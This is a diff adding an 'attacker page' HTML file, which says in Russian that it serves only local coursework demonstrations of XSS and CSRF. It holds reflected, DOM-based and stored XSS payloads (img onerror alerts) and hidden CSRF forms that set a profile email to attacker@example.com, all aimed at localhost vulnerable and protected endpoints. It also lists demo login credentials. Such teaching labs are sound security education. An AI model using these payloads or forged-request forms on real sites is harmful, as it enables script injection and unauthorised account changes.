@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="ru">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Attacker page</title>
+    <style>
+      body { font-family: Arial, sans-serif; max-width: 850px; margin: 30px auto; padding: 0 16px; }
+      section { border: 1px solid #bbb; padding: 16px; margin-bottom: 16px; }
+      button { margin: 6px 6px 6px 0; }
+      code { background: #eee; padding: 2px 4px; }
+    </style>
+  </head>
+  <body>
+    <h1>Страница «атакующего»</h1>
+    <p>Используется только локально для демонстрации XSS и CSRF в курсовой работе.</p>
+
+    <section>
+      <h2>Reflected XSS</h2>
+      <code>&lt;img src=x onerror="alert('Reflected XSS')"&gt;</code>
+      <br />
+      <button type="button" onclick="openDemo(&quot;http://localhost:3000/vulnerable?search=%3Cimg%20src%3Dx%20onerror%3D%22alert('Reflected%20XSS')%22%3E&quot;)">Vulnerable</button>
+      <button type="button" onclick="openDemo(&quot;http://localhost:3000/protected?search=%3Cimg%20src%3Dx%20onerror%3D%22alert('Reflected%20XSS')%22%3E&quot;)">Protected</button>
+    </section>
+
+    <section>
+      <h2>DOM-based XSS</h2>
+      <code>#&lt;img src=x onerror="alert('DOM XSS')"&gt;</code>
+      <br />
+      <button type="button" onclick="openDemo(&quot;http://localhost:3000/vulnerable#%3Cimg%20src%3Dx%20onerror%3D%22alert('DOM%20XSS')%22%3E&quot;)">Vulnerable</button>
+      <button type="button" onclick="openDemo(&quot;http://localhost:3000/protected#%3Cimg%20src%3Dx%20onerror%3D%22alert('DOM%20XSS')%22%3E&quot;)">Protected</button>
+    </section>
+
+    <section>
+      <h2>Stored XSS</h2>
+      <form id="stored-xss" action="http://localhost:3000/api/comments?mode=vulnerable" method="post" target="_blank">
+        <input type="hidden" name="text" value="&lt;img src=x onerror=&quot;alert('Stored XSS')&quot;&gt;" />
+      </form>
+      <button type="button" onclick="submitAttack('stored-xss')">Сохранить вредоносный комментарий</button>
+      <p>После отправки откройте <code>http://localhost:3000/vulnerable</code>.</p>
+    </section>
+
+    <section>
+      <h2>CSRF</h2>
+      <p>Сначала войдите как <code>student / 1234</code> в нужном режиме.</p>
+      <form id="csrf-vulnerable" action="http://localhost:3000/api/profile/email?mode=vulnerable" method="post" target="_blank">
+        <input type="hidden" name="email" value="attacker@example.com" />
+      </form>
+      <form id="csrf-protected" action="http://localhost:3000/api/profile/email?mode=protected" method="post" target="_blank">
+        <input type="hidden" name="email" value="attacker@example.com" />
+      </form>
+      <button type="button" onclick="submitAttack('csrf-vulnerable')">CSRF против vulnerable</button>
+      <button type="button" onclick="submitAttack('csrf-protected')">CSRF против protected</button>
+      <p>Protected-запрос должен получить HTTP 403 из-за отсутствия корректного CSRF-токена.</p>
+    </section>
+
+    <script src="attacker.js"></script>
+  </body>
+</html>
